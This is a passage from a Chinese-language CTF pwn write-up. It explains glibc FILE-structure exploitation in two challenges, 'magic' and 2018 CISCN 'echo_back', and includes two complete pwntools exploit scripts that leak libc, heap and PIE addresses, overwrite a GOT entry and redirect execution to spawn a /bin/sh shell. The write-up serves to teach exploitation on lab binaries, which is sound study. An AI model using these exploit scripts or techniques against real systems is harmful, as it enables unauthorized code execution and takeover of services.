        spell(p, 0, p64(puts_got) + p64(puts_got + 0x100))
        libc_addr = u64(p.recvn(6).ljust(8,'x00')) - puts_offest
利用上文说到的方法就可以泄漏出libc基址。
但是我们还需要heap基址用于got表修改，所以需要再泄漏一个地址，所以我们要使_IO_write_ptr指向泄漏libc之前的位置。
    spell(p, -2, p64(0) + p64(0))
这样之后就可以用相同的方法再泄漏heap的基址：
        spell(p, 0, 'x00' * 2 + p64(0x231) + p64(0xfbad24a8))
        spell(p, 0, p64(log_addr) + p64(puts_got + 0x100) + p64(0))
        heap_addr = u64(p.recvn(8)) - 0x10
接下来是修改got表部分：
    spell(p, 0, p64(heap_addr + 0x58) + p64(0) + p64(heap_addr + 0x58))
    spell(p, 0, p64(0x602122) + p64(0x602123 + 0x100))
在泄漏完heap基址后，log_file结构如下：
可以看到_IO_write_ptr为0x2042030，这样的话我们去执行上面脚本的第一行，因为输出的长度为0x18，这样修改的话就会变成下图这样：
这样的话，就符合了我们上面说的任意写的条件，接下来就可以去修改_IO_buf_baseh和_IO_buf_end。（也就是第二行代码）。
我在上文提到了：
_IO_new_file_underflow中在执行系统调用之前会设置一次FILE指针，将  
_IO_read_base、_IO_read_ptr、fp->_IO_read_end、_IO_write_base、IO_write_ptr全部设置为_IO_buf_base。
所以我们在执行完上面两行代码后_IO_write_ptr就会指向0x602122（它位于fwrite函数got表的下方）
接下来我们就要调整IO_write_ptr的值来修改got表。
        spell(p, -2, 'x00')
        spell(p, -2, 'x01')
        spell(p, -2, 'x00')
        spell(p, 0, 'x00' * 2 + p64(libc_addr + system_offest)[0 : 6])
        spell(p, 0, '/bin/sh')
这里有一点需要注意，就是spell(p, -2, ‘x01’)，这里必须要大于0，因为：
这里如果满足不了第一个if，就会跳转到muggle那部分。
完整的exp：
    # coding:utf-8
    from pwn import *
    context(arch = 'amd64', os = 'linux')
    context.log_level = 'debug'
    debug=1
    ip='111.198.29.45'
    port='31577'
    if debug == 1:
       p = process('./magic')
    else:
       p = remote(ip, port)
    puts_offest = 0x6f690
    system_offest = 0x45390
    puts_got = 0x602020
    fwrite_got = 0x602090
    log_addr = 0x6020E0
    def debug():
        gdb.attach(p)
        pause()
    def create(p, name):
        p.recvuntil('choice>> ')
        p.sendline('1')
        p.recvuntil('name:')
        p.send(name)
    def spell(p, index, data):
        p.recvuntil('choice>> ')
        p.sendline('2')
        p.recvuntil('spell:')
        p.sendline(str(index))
        p.recvuntil('name:')
        p.send(data)
    def final(p, index):
        p.recvuntil('choice>> ')
        p.sendline('3')
        p.recvuntil('chance:')
        p.sendline(str(index))
    def pwn():
        create(p, 'sss')
        spell(p, 0, 'yyyyy')
        for i in range(12):
            spell(p, -2, 'x00')  
        spell(p, -2, 'x00' * 13)
        spell(p, -2, 'x00' * 9)
        #debug()
        spell(p, 0, 'x00' * 3 + p64(0x231) + p64(0xfbad24a8))
        spell(p, 0, p64(puts_got) + p64(puts_got + 0x100))
        libc_addr = u64(p.recvn(6).ljust(8,'x00')) - puts_offest
        log.info('libc addr is : ' + hex(libc_addr))
        #debug()
        spell(p, -2, p64(0) + p64(0))
        spell(p, 0, 'x00' * 2 + p64(0x231) + p64(0xfbad24a8))
        spell(p, 0, p64(log_addr) + p64(puts_got + 0x100) + p64(0))
        heap_addr = u64(p.recvn(8)) - 0x10
        log.info('heap addr is : ' + hex(heap_addr))
        debug()
        spell(p, 0, p64(heap_addr + 0x58) + p64(0) + p64(heap_addr + 0x58))
        #debug()
        spell(p, 0, p64(0x602122) + p64(0x602123 + 0x100))
        spell(p, -2, 'x00')
        spell(p, -2, 'x01')
        spell(p, -2, 'x00')
        spell(p, 0, 'x00' * 2 + p64(libc_addr + system_offest)[0 : 6])
        spell(p, 0, '/bin/sh')
        p.interactive()
    if __name__ == '__main__':
        pwn()
###  2018 ciscn each_back
日常检查，保护全家桶。
这道题的格式化字符串漏洞很明显
因为它开启了pie，所以我们最开始的思路就是要泄漏出一些我们需要的地址。
首先查看stack，寻找一些有用的信息：
这里我标出了三个内容（计算偏移时不要忘了这是64位程序，前六个参数保存在寄存器里）：
1.main函数的ebp
2.函数的返回地址，它对应main函数中的地址，所以我们可以借此获得程序的基地址（elf_ddr）
3.可以得到libc基址
printf函数返回地址的求法：
因为main函数里并没有修改rbp、rsp，所以这里printf函数的返回地址为main函数的rsp（也就是我们这里泄漏出的ebp） -0x28。
今天的重头戏来了：
他限制了我们输入的长度不能超过7，我们要想修改函数返回地址，payload不可能比7字节短，所以我们这里要找其他输入payload的方式，这里我们盯上了scanf函数。
我们就用上文提到的方法来修改scanf可输入的长度：
    payload = p64(libc.address+0x3c4963)*3 + p64(stack_addr-0x28)+p64(stack_addr+0x10)
    p.send(payload)
这里就有一点需要注意了，上文我留下的第三部分，就是：
    fp->_IO_read_end += count;
我们在修改完长度之后,_IO_read_end就会加上我们payload长度的大小，这样就会导致后面输入payload来修改返回地址时，fp->_IO_read_ptr
_IO_read_end的条件无法实现，所以我们这里利用getchar函数（每次会使_IO_read_ptr+1）来让这个条件满足：
    for i in range(len(payload)-1):
        p.recvuntil('choice>>')
        p.sendline('2') 
        p.recvuntil('length:')
        p.sendline('')
这里主要说一下scanf的利用，关于格式化字符串的内容就不过多的叙述。
完整exp：
    #coding:utf-8
    from pwn import *
    context.log_level = 'debug'
    debug = 1
    elf = ELF('./echo_back')
    if debug:
         p = process('./echo_back')
         libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
         context.log_level = 'debug'
    else:
         p = remote('', xxxx)
         libc = ELF('./libc.so.6')
    def dubug():
        gdb.attach(p)
        pause()
    def set_name(name):
        p.recvuntil('choice>>')
        p.sendline('1')
        p.recvuntil('name')
        p.send(name)
    def echo(content):
        p.recvuntil('choice>>')
        p.sendline('2') 
        p.recvuntil('length:')
        p.sendline('-1')
        p.send(content)
    #----------------------------stack----------------------------------------------    echo('%12$pn')
    p.recvuntil('anonymous say:')
    stack_addr = int(p.recvline()[:-1],16)
    #----------------------------elf---------------------------------------------    echo('%13$pn')
    p.recvuntil('anonymous say:')
    pie = int(p.recvline()[:-1],16)-0xd08
    #----------------------------libc---------------------------------------------    echo('%19$pn')
    p.recvuntil('anonymous say:')
    libc.address = int(p.recvline()[:-1],16)-240-libc.symbols['__libc_start_main']
    print '[+] system :',hex(libc.symbols['system'])
    set_name(p64(libc.address + 0x3c4918)[:-1])
    echo('%16$hhn')
    p.recvuntil('choice>>')
    p.sendline('2') 
    p.recvuntil('length:')
    payload = p64(libc.address+0x3c4963)*3 + p64(stack_addr-0x28)+p64(stack_addr+0x10)
    p.send(payload)
    p.sendline('')
    for i in range(len(payload)-1):
        p.recvuntil('choice>>')
        p.sendline('2') 
        p.recvuntil('length:')
        p.sendline('')
    p.recvuntil('choice>>')
    p.sendline('2') 
    p.recvuntil('length:')
    payload = p64(pie+0xd93)+p64(next(libc.search('/bin/sh')))+p64(libc.symbols['system'])
    p.sendline(payload)
    p.sendline('')
    p.interactive()
参考资料：